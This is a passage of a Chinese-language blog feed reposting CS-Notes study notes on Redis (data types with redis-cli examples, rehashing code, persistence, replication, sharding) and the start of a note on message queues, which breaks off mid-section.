src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/fb327611-7e2b-4f2f-9f5b-38592d408f07.png" alt="img"></a></p><pre><code>&gt; rpush list-key item(integer) 1&gt; rpush list-key item2(integer) 2&gt; rpush list-key item(integer) 3&gt; lrange list-key 0 -11) &quot;item&quot;2) &quot;item2&quot;3) &quot;item&quot;&gt; lindex list-key 1&quot;item2&quot;&gt; lpop list-key&quot;item&quot;&gt; lrange list-key 0 -11) &quot;item2&quot;2) &quot;item&quot;</code></pre><h2 id="SET"><a href="#SET" class="headerlink" title="SET"></a>SET</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/cd5fbcff-3f35-43a6-8ffa-082a93ce0f0e.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/cd5fbcff-3f35-43a6-8ffa-082a93ce0f0e.png" alt="img"></a></p><pre><code>&gt; sadd set-key item(integer) 1&gt; sadd set-key item2(integer) 1&gt; sadd set-key item3(integer) 1&gt; sadd set-key item(integer) 0&gt; smembers set-key1) &quot;item&quot;2) &quot;item2&quot;3) &quot;item3&quot;&gt; sismember set-key item4(integer) 0&gt; sismember set-key item(integer) 1&gt; srem set-key item2(integer) 1&gt; srem set-key item2(integer) 0&gt; smembers set-key1) &quot;item&quot;2) &quot;item3&quot;</code></pre><h2 id="HASH"><a href="#HASH" class="headerlink" title="HASH"></a>HASH</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/7bd202a7-93d4-4f3a-a878-af68ae25539a.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/7bd202a7-93d4-4f3a-a878-af68ae25539a.png" alt="img"></a></p><pre><code>&gt; hset hash-key sub-key1 value1(integer) 1&gt; hset hash-key sub-key2 value2(integer) 1&gt; hset hash-key sub-key1 value1(integer) 0&gt; hgetall hash-key1) &quot;sub-key1&quot;2) &quot;value1&quot;3) &quot;sub-key2&quot;4) &quot;value2&quot;&gt; hdel hash-key sub-key2(integer) 1&gt; hdel hash-key sub-key2(integer) 0&gt; hget hash-key sub-key1&quot;value1&quot;&gt; hgetall hash-key1) &quot;sub-key1&quot;2) &quot;value1&quot;</code></pre><h2 id="ZSET"><a href="#ZSET" class="headerlink" title="ZSET"></a>ZSET</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1202b2d6-9469-4251-bd47-ca6034fb6116.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1202b2d6-9469-4251-bd47-ca6034fb6116.png" alt="img"></a></p><pre><code>&gt; zadd zset-key 728 member1(integer) 1&gt; zadd zset-key 982 member0(integer) 1&gt; zadd zset-key 982 member0(integer) 0&gt; zrange zset-key 0 -1 withscores1) &quot;member1&quot;2) &quot;728&quot;3) &quot;member0&quot;4) &quot;982&quot;&gt; zrangebyscore zset-key 0 800 withscores1) &quot;member1&quot;2) &quot;728&quot;&gt; zrem zset-key member1(integer) 1&gt; zrem zset-key member1(integer) 0&gt; zrange zset-key 0 -1 withscores1) &quot;member0&quot;2) &quot;982&quot;</code></pre><h1 id="三、数据结构"><a href="#三、数据结构" class="headerlink" title="三、数据结构"></a>三、数据结构</h1><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>dictht 是一个散列表结构，使用拉链法保存哈希冲突。</p><pre><code>/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. */typedef struct dictht {    dictEntry **table;    unsigned long size;    unsigned long sizemask;    unsigned long used;} dictht;typedef struct dictEntry {    void *key;    union {        void *val;        uint64_t u64;        int64_t s64;        double d;    } v;    struct dictEntry *next;} dictEntry;</code></pre><p>Redis 的字典 dict 中包含两个哈希表 dictht，这是为了方便进行 rehash 操作。在扩容时，将其中一个 dictht 上的键值对 rehash 到另一个 dictht 上面，完成之后释放空间并交换两个 dictht 的角色。</p><pre><code>typedef struct dict {    dictType *type;    void *privdata;    dictht ht[2];    long rehashidx; /* rehashing not in progress if rehashidx == -1 */    unsigned long iterators; /* number of iterators currently running */} dict;</code></pre><p>rehash 操作不是一次性完成，而是采用渐进方式，这是为了避免一次性执行过多的 rehash 操作给服务器带来过大的负担。</p><p>渐进式 rehash 通过记录 dict 的 rehashidx 完成，它从 0 开始，然后每执行一次 rehash 都会递增。例如在一次 rehash 中，要把 dict[0] rehash 到 dict[1]，这一次会把 dict[0] 上 table[rehashidx] 的键值对 rehash 到 dict[1] 上，dict[0] 的 table[rehashidx] 指向 null，并令 rehashidx++。</p><p>在 rehash 期间，每次对字典执行添加、删除、查找或者更新操作时，都会执行一次渐进式 rehash。</p><p>采用渐进式 rehash 会导致字典中的数据分散在两个 dictht 上，因此对字典的查找操作也需要到对应的 dictht 去执行。</p><pre><code>/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */int dictRehash(dict *d, int n) {    int empty_visits = n * 10; /* Max number of empty buckets to visit. */    if (!dictIsRehashing(d)) return 0;    while (n-- &amp;&amp; d-&gt;ht[0].used != 0) {        dictEntry *de, *nextde;        /* Note that rehashidx can&#39;t overflow as we are sure there are more         * elements because ht[0].used != 0 */        assert(d-&gt;ht[0].size &gt; (unsigned long) d-&gt;rehashidx);        while (d-&gt;ht[0].table[d-&gt;rehashidx] == NULL) {            d-&gt;rehashidx++;            if (--empty_visits == 0) return 1;        }        de = d-&gt;ht[0].table[d-&gt;rehashidx];        /* Move all the keys in this bucket from the old to the new hash HT */        while (de) {            uint64_t h;            nextde = de-&gt;next;            /* Get the index in the new hash table */            h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[1].sizemask;            de-&gt;next = d-&gt;ht[1].table[h];            d-&gt;ht[1].table[h] = de;            d-&gt;ht[0].used--;            d-&gt;ht[1].used++;            de = nextde;        }        d-&gt;ht[0].table[d-&gt;rehashidx] = NULL;        d-&gt;rehashidx++;    }    /* Check if we already rehashed the whole table... */    if (d-&gt;ht[0].used == 0) {        zfree(d-&gt;ht[0].table);        d-&gt;ht[0] = d-&gt;ht[1];        _dictReset(&amp;d-&gt;ht[1]);        d-&gt;rehashidx = -1;        return 0;    }    /* More to rehash... */    return 1;}</code></pre><h2 id="跳跃表"><a href="#跳跃表" class="headerlink" title="跳跃表"></a>跳跃表</h2><p>是有序集合的底层实现之一。</p><p>跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/beba612e-dc5b-4fc2-869d-0b23408ac90a.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/beba612e-dc5b-4fc2-869d-0b23408ac90a.png" alt="img"></a></p><p>在查找时，从上层指针开始查找，找到对应的区间之后再到下一层去查找。下图演示了查找 22 的过程。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/0ea37ee2-c224-4c79-b895-e131c6805c40.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/0ea37ee2-c224-4c79-b895-e131c6805c40.png" alt="img"></a></p><p>与红黑树等平衡树相比，跳跃表具有以下优点：</p><ul><li>插入速度非常快速，因为不需要进行旋转等操作来维护平衡性；</li><li>更容易实现；</li><li>支持无锁操作。</li></ul><h1 id="四、使用场景"><a href="#四、使用场景" class="headerlink" title="四、使用场景"></a>四、使用场景</h1><h2 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h2><p>可以对 String 进行自增自减运算，从而实现计数器功能。</p><p>Redis 这种内存型数据库的读写性能非常高，很适合存储频繁读写的计数量。</p><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>将热点数据放到内存中，设置内存的最大使用量以及淘汰策略来保证缓存的命中率。</p><h2 id="查找表"><a href="#查找表" class="headerlink" title="查找表"></a>查找表</h2><p>例如 DNS 记录就很适合使用 Redis 进行存储。</p><p>查找表和缓存类似，也是利用了 Redis 快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效，因为缓存不作为可靠的数据来源。</p><h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><p>List 是一个双向链表，可以通过 lpop 和 lpush 写入和读取消息。</p><p>不过最好使用 Kafka、RabbitMQ 等消息中间件。</p><h2 id="会话缓存"><a href="#会话缓存" class="headerlink" title="会话缓存"></a>会话缓存</h2><p>可以使用 Redis 来统一存储多台应用服务器的会话信息。</p><p>当应用服务器不再存储用户的会话信息，也就不再具有状态，一个用户可以请求任意一个应用服务器，从而更容易实现高可用性以及可伸缩性。</p><h2 id="分布式锁实现"><a href="#分布式锁实现" class="headerlink" title="分布式锁实现"></a>分布式锁实现</h2><p>在分布式场景下，无法使用单机环境下的锁来对多个节点上的进程进行同步。</p><p>可以使用 Reids 自带的 SETNX 命令实现分布式锁，除此之外，还可以使用官方提供的 RedLock 分布式锁实现。</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>Set 可以实现交集、并集等操作，从而实现共同好友等功能。</p><p>ZSet 可以实现有序性操作，从而实现排行榜等功能。</p><h1 id="五、Redis-与-Memcached"><a href="#五、Redis-与-Memcached" class="headerlink" title="五、Redis 与 Memcached"></a>五、Redis 与 Memcached</h1><p>两者都是非关系型内存键值数据库，主要有以下不同：</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>Memcached 仅支持字符串类型，而 Redis 支持五种不同的数据类型，可以更灵活地解决问题。</p><h2 id="数据持久化"><a href="#数据持久化" class="headerlink" title="数据持久化"></a>数据持久化</h2><p>Redis 支持两种持久化策略：RDB 快照和 AOF 日志，而 Memcached 不支持持久化。</p><h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h2><p>Memcached 不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。</p><p>Redis Cluster 实现了分布式的支持。</p><h2 id="内存管理机制"><a href="#内存管理机制" class="headerlink" title="内存管理机制"></a>内存管理机制</h2><ul><li>在 Redis 中，并不是所有数据都一直存储在内存中，可以将一些很久没用的 value 交换到磁盘，而 Memcached 的数据则会一直在内存中。</li><li>Memcached 将内存分割成特定长度的块来存储数据，以完全解决内存碎片的问题。但是这种方式会使得内存的利用率不高，例如块的大小为 128 bytes，只存储 100 bytes 的数据，那么剩下的 28 bytes 就浪费掉了。</li></ul><h1 id="六、键的过期时间"><a href="#六、键的过期时间" class="headerlink" title="六、键的过期时间"></a>六、键的过期时间</h1><p>Redis 可以为每个键设置过期时间，当键过期时，会自动删除该键。</p><p>对于散列表这种容器，只能为整个键设置过期时间（整个散列表），而不能为键里面的单个元素设置过期时间。</p><h1 id="七、数据淘汰策略"><a href="#七、数据淘汰策略" class="headerlink" title="七、数据淘汰策略"></a>七、数据淘汰策略</h1><p>可以设置内存最大使用量，当内存使用量超出时，会施行数据淘汰策略。</p><p>Reids 具体有 6 种淘汰策略：</p><table><thead><tr><th>策略</th><th>描述</th></tr></thead><tbody><tr><td>volatile-lru</td><td>从已设置过期时间的数据集中挑选最近最少使用的数据淘汰</td></tr><tr><td>volatile-ttl</td><td>从已设置过期时间的数据集中挑选将要过期的数据淘汰</td></tr><tr><td>volatile-random</td><td>从已设置过期时间的数据集中任意选择数据淘汰</td></tr><tr><td>allkeys-lru</td><td>从所有数据集中挑选最近最少使用的数据淘汰</td></tr><tr><td>allkeys-random</td><td>从所有数据集中任意选择数据进行淘汰</td></tr><tr><td>noeviction</td><td>禁止驱逐数据</td></tr></tbody></table><p>作为内存数据库，出于对性能和内存消耗的考虑，Redis 的淘汰算法实际实现上并非针对所有 key，而是抽样一小部分并且从中选出被淘汰的 key。</p><p>使用 Redis 缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据。可以将内存最大使用量设置为热点数据占用的内存量，然后启用 allkeys-lru 淘汰策略，将最近最少使用的数据淘汰。</p><p>Redis 4.0 引入了 volatile-lfu 和 allkeys-lfu 淘汰策略，LFU 策略通过统计访问频率，将访问频率最少的键值对淘汰。</p><h1 id="八、持久化"><a href="#八、持久化" class="headerlink" title="八、持久化"></a>八、持久化</h1><p>Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。</p><h2 id="RDB-持久化"><a href="#RDB-持久化" class="headerlink" title="RDB 持久化"></a>RDB 持久化</h2><p>将某个时间点的所有数据都存放到硬盘上。</p><p>可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。</p><p>如果系统发生故障，将会丢失最后一次创建快照之后的数据。</p><p>如果数据量很大，保存快照的时间会很长。</p><h2 id="AOF-持久化"><a href="#AOF-持久化" class="headerlink" title="AOF 持久化"></a>AOF 持久化</h2><p>将写命令添加到 AOF 文件（Append Only File）的末尾。</p><p>使用 AOF 持久化需要设置同步选项，从而确保写命令什么时候会同步到磁盘文件上。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。有以下同步选项：</p><table><thead><tr><th>选项</th><th>同步频率</th></tr></thead><tbody><tr><td>always</td><td>每个写命令都同步</td></tr><tr><td>everysec</td><td>每秒同步一次</td></tr><tr><td>no</td><td>让操作系统来决定何时同步</td></tr></tbody></table><ul><li>always 选项会严重减低服务器的性能；</li><li>everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响；</li><li>no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。</li></ul><p>随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。</p><h1 id="九、事务"><a href="#九、事务" class="headerlink" title="九、事务"></a>九、事务</h1><p>一个事务包含了多个命令，服务器在执行事务期间，不会改去执行其它客户端的命令请求。</p><p>事务中的多个命令被一次性发送给服务器，而不是一条一条发送，这种方式被称为流水线，它可以减少客户端与服务器之间的网络通信次数从而提升性能。</p><p>Redis 最简单的事务实现方式是使用 MULTI 和 EXEC 命令将事务操作包围起来。</p><h1 id="十、事件"><a href="#十、事件" class="headerlink" title="十、事件"></a>十、事件</h1><p>Redis 服务器是一个事件驱动程序。</p><h2 id="文件事件"><a href="#文件事件" class="headerlink" title="文件事件"></a>文件事件</h2><p>服务器通过套接字与客户端或者其它服务器进行通信，文件事件就是对套接字操作的抽象。</p><p>Redis 基于 Reactor 模式开发了自己的网络事件处理器，使用 I/O 多路复用程序来同时监听多个套接字，并将到达的事件传送给文件事件分派器，分派器会根据套接字产生的事件类型调用相应的事件处理器。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/9ea86eb5-000a-4281-b948-7b567bd6f1d8.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/9ea86eb5-000a-4281-b948-7b567bd6f1d8.png" alt="img"></a></p><h2 id="时间事件"><a href="#时间事件" class="headerlink" title="时间事件"></a>时间事件</h2><p>服务器有一些操作需要在给定的时间点执行，时间事件是对这类定时操作的抽象。</p><p>时间事件又分为：</p><ul><li>定时事件：是让一段程序在指定的时间之内执行一次；</li><li>周期性事件：是让一段程序每隔指定时间就执行一次。</li></ul><p>Redis 将所有时间事件都放在一个无序链表中，通过遍历整个链表查找出已到达的时间事件，并调用相应的事件处理器。</p><h2 id="事件的调度与执行"><a href="#事件的调度与执行" class="headerlink" title="事件的调度与执行"></a>事件的调度与执行</h2><p>服务器需要不断监听文件事件的套接字才能得到待处理的文件事件，但是不能一直监听，否则时间事件无法在规定的时间内执行，因此监听时间应该根据距离现在最近的时间事件来决定。</p><p>事件调度与执行由 aeProcessEvents 函数负责，伪代码如下：</p><pre><code>def aeProcessEvents():    # 获取到达时间离当前时间最接近的时间事件    time_event = aeSearchNearestTimer()    # 计算最接近的时间事件距离到达还有多少毫秒    remaind_ms = time_event.when - unix_ts_now()    # 如果事件已到达，那么 remaind_ms 的值可能为负数，将它设为 0    if remaind_ms &lt; 0:        remaind_ms = 0    # 根据 remaind_ms 的值，创建 timeval    timeval = create_timeval_with_ms(remaind_ms)    # 阻塞并等待文件事件产生，最大阻塞时间由传入的 timeval 决定    aeApiPoll(timeval)    # 处理所有已产生的文件事件    procesFileEvents()    # 处理所有已到达的时间事件    processTimeEvents()</code></pre><p>将 aeProcessEvents 函数置于一个循环里面，加上初始化和清理函数，就构成了 Redis 服务器的主函数，伪代码如下：</p><pre><code>def main():    # 初始化服务器    init_server()    # 一直处理事件，直到服务器关闭为止    while server_is_not_shutdown():        aeProcessEvents()    # 服务器关闭，执行清理操作    clean_server()</code></pre><p>从事件处理的角度来看，服务器运行流程如下：</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c0a9fa91-da2e-4892-8c9f-80206a6f7047.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c0a9fa91-da2e-4892-8c9f-80206a6f7047.png" alt="img"></a></p><h1 id="十一、复制"><a href="#十一、复制" class="headerlink" title="十一、复制"></a>十一、复制</h1><p>通过使用 slaveof host port 命令来让一个服务器成为另一个服务器的从服务器。</p><p>一个从服务器只能有一个主服务器，并且不支持主主复制。</p><h2 id="连接过程"><a href="#连接过程" class="headerlink" title="连接过程"></a>连接过程</h2><ol><li>主服务器创建快照文件，发送给从服务器，并在发送期间使用缓冲区记录执行的写命令。快照文件发送完毕之后，开始向从服务器发送存储在缓冲区中的写命令；</li><li>从服务器丢弃所有旧数据，载入主服务器发来的快照文件，之后从服务器开始接受主服务器发来的写命令；</li><li>主服务器每执行一次写命令，就向从服务器发送相同的写命令。</li></ol><h2 id="主从链"><a href="#主从链" class="headerlink" title="主从链"></a>主从链</h2><p>随着负载不断上升，主服务器可能无法很快地更新所有从服务器，或者重新连接和重新同步从服务器将导致系统超载。为了解决这个问题，可以创建一个中间层来分担主服务器的复制工作。中间层的服务器是最上层服务器的从服务器，又是最下层服务器的主服务器。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/395a9e83-b1a1-4a1d-b170-d081e7bb5bab.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/395a9e83-b1a1-4a1d-b170-d081e7bb5bab.png" alt="img"></a></p><h1 id="十二、Sentinel"><a href="#十二、Sentinel" class="headerlink" title="十二、Sentinel"></a>十二、Sentinel</h1><p>Sentinel（哨兵）可以监听集群中的服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。</p><h1 id="十三、分片"><a href="#十三、分片" class="headerlink" title="十三、分片"></a>十三、分片</h1><p>分片是将数据划分为多个部分的方法，可以将数据存储到多台机器里面，这种方法在解决某些问题时可以获得线性级别的性能提升。</p><p>假设有 4 个 Reids 实例 R0，R1，R2，R3，还有很多表示用户的键 user:1，user:2，… ，有不同的方式来选择一个指定的键存储在哪个实例中。</p><ul><li>最简单的方式是范围分片，例如用户 id 从 0~1000 的存储到实例 R0 中，用户 id 从 1001~2000 的存储到实例 R1 中，等等。但是这样需要维护一张映射范围表，维护操作代价很高。</li><li>还有一种方式是哈希分片，使用 CRC32 哈希函数将键转换为一个数字，再对实例数量求模就能知道应该存储的实例。</li></ul><p>根据执行分片的位置，可以分为三种分片方式：</p><ul><li>客户端分片：客户端使用一致性哈希等算法决定键应当分布到哪个节点。</li><li>代理分片：将客户端请求发送到代理上，由代理转发请求到正确的节点上。</li><li>服务器分片：Redis Cluster。</li></ul><h1 id="十四、一个简单的论坛系统分析"><a href="#十四、一个简单的论坛系统分析" class="headerlink" title="十四、一个简单的论坛系统分析"></a>十四、一个简单的论坛系统分析</h1><p>该论坛系统功能如下：</p><ul><li>可以发布文章；</li><li>可以对文章进行点赞；</li><li>在首页可以按文章的发布时间或者文章的点赞数进行排序显示。</li></ul><h2 id="文章信息"><a href="#文章信息" class="headerlink" title="文章信息"></a>文章信息</h2><p>文章包括标题、作者、赞数等信息，在关系型数据库中很容易构建一张表来存储这些信息，在 Redis 中可以使用 HASH 来存储每种信息以及其对应的值的映射。</p><p>Redis 没有关系型数据库中的表这一概念来将同种类型的数据存放在一起，而是使用命名空间的方式来实现这一功能。键名的前面部分存储命名空间，后面部分的内容存储 ID，通常使用 : 来进行分隔。例如下面的 HASH 的键名为 article:92617，其中 article 为命名空间，ID 为 92617。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/7c54de21-e2ff-402e-bc42-4037de1c1592.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/7c54de21-e2ff-402e-bc42-4037de1c1592.png" alt="img"></a></p><h2 id="点赞功能"><a href="#点赞功能" class="headerlink" title="点赞功能"></a>点赞功能</h2><p>当有用户为一篇文章点赞时，除了要对该文章的 votes 字段进行加 1 操作，还必须记录该用户已经对该文章进行了点赞，防止用户点赞次数超过 1。可以建立文章的已投票用户集合来进行记录。</p><p>为了节约内存，规定一篇文章发布满一周之后，就不能再对它进行投票，而文章的已投票集合也会被删除，可以为文章的已投票集合设置一个一周的过期时间就能实现这个规定。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/485fdf34-ccf8-4185-97c6-17374ee719a0.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/485fdf34-ccf8-4185-97c6-17374ee719a0.png" alt="img"></a></p><h2 id="对文章进行排序"><a href="#对文章进行排序" class="headerlink" title="对文章进行排序"></a>对文章进行排序</h2><p>为了按发布时间和点赞数进行排序，可以建立一个文章发布时间的有序集合和一个文章点赞数的有序集合。（下图中的 score 就是这里所说的点赞数；下面所示的有序集合分值并不直接是时间和点赞数，而是根据时间和点赞数间接计算出来的）</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/f7d170a3-e446-4a64-ac2d-cb95028f81a8.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/f7d170a3-e446-4a64-ac2d-cb95028f81a8.png" alt="img"></a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013.</li><li><a href="http://redisbook.com/index.html" target="_blank" rel="noopener">黄健宏. Redis 设计与实现 [M]. 机械工业出版社, 2014.</a></li><li><a href="https://redislabs.com/ebook/foreword/" target="_blank" rel="noopener">REDIS IN ACTION</a></li><li><a href="http://ticki.github.io/blog/skip-lists-done-right/" target="_blank" rel="noopener">Skip Lists: Done Right</a></li><li><a href="http://www.cnblogs.com/loveincode/p/7411911.html" target="_blank" rel="noopener">论述 Redis 和 Memcached 的差异</a></li><li><a href="http://wiki.jikexueyuan.com/project/redis-guide" target="_blank" rel="noopener">Redis 3.0 中文版- 分片</a></li><li><a href="http://www.scienjus.com/redis-use-case/" target="_blank" rel="noopener">Redis 应用场景</a></li><li><a href="https://redis.io/topics/lru-cache" target="_blank" rel="noopener">Using Redis as an LRU cache</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Redis.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>消息队列</title>
      <link href="/2018/12/24/xi-tong-she-ji/xiao-xi-dui-lie/"/>
      <url>/2018/12/24/xi-tong-she-ji/xiao-xi-dui-lie/</url>
      
        <content type="html"><![CDATA[<h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><ul><li>一、消息模型<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#%E7%82%B9%E5%AF%B9%E7%82%B9">点对点</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85">发布/订阅</a></li></ul></li><li>二、使用场景<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86">异步处理</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#%E6%B5%81%E9%87%8F%E5%89%8A%E9%94%8B">流量削锋</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#%E5%BA%94%E7%94%A8%E8%A7%A3%E8%80%A6">应用解耦</a></li></ul></li><li>三、可靠性<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#%E5%8F%91%E9%80%81%E7%AB%AF%E7%9A%84%E5%8F%AF%E9%9D%A0%E6%80%A7">发送端的可靠性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#%E6%8E%A5%E6%94%B6%E7%AB%AF%E7%9A%84%E5%8F%AF%E9%9D%A0%E6%80%A7">接收端的可靠性</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、消息模型"><a href="#一、消息模型" class="headerlink" title="一、消息模型"></a>一、消息模型</h1><h2 id="点对点"><a href="#点对点" class="headerlink" title="点对点"></a>点对点</h2><p>消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/685a692f-8f76-4cac-baac-b68e2df9a30f.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/685a692f-8f76-4cac-baac-b68e2df9a30f.jpg" alt="img"></a></p><h2 id="发布-订阅"><a href="#发布-订阅" class="headerlink" title="发布/订阅"></a>发布/订阅</h2><p>消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/ddb5ff4c-4ada-46aa-9bf1-140bdb5e4676.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/ddb5ff4c-4ada-46aa-9bf1-140bdb5e4676.jpg" alt="img"></a></p><p>发布与订阅模式和观察者模式有以下不同：</p><ul><li>观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，发布者与订阅者不知道对方的存在，它们之间通过频道进行通信。</li><li>观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，发布者向频道发送一个消息之后，就不需要关心订阅者何时去订阅这个消息，可以立即返回。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/bee1ff1d-c80f-4b3c-b58c-7073a8896ab2.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/bee1ff1d-c80f-4b3c-b58c-7073a8896ab2.jpg" alt="img"></a></p><h1 id="二、使用场景"><a href="#二、使用场景" class="headerlink" title="二、使用场景"></a>二、使用场景</h1><h2 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h2><p>发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。</p><p>例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。</p><p>只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。</p><h2 id="流量削锋"><a href="#流量削锋" class="headerlink" title="流量削锋"></a>流量削锋</h2><p>在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。</p><p>可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。</p><h2 id="应用解耦"><a href="#应用解耦" class="headerlink" title="应用解耦"></a>应用解耦</h2><p>如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。</p><p>通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。</p><h1 id="三、可靠性"><a href="#三、可靠性" class="headerlink" title="三、可靠性"></a>三、可靠性</h1><h2 id="发送端的可靠性"><a href="#发送端的可靠性" class="headerlink" title="发送端的可靠性"></a>发送端的可靠性</h2><p>发送端完成操作后一定能将消息成功发送到消息队列中。</p><p>实现方法：</p><ul><li>在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。</li></ul><h2 id="接收端的可靠性"><a href="#接收端的可靠性" class="headerlink" 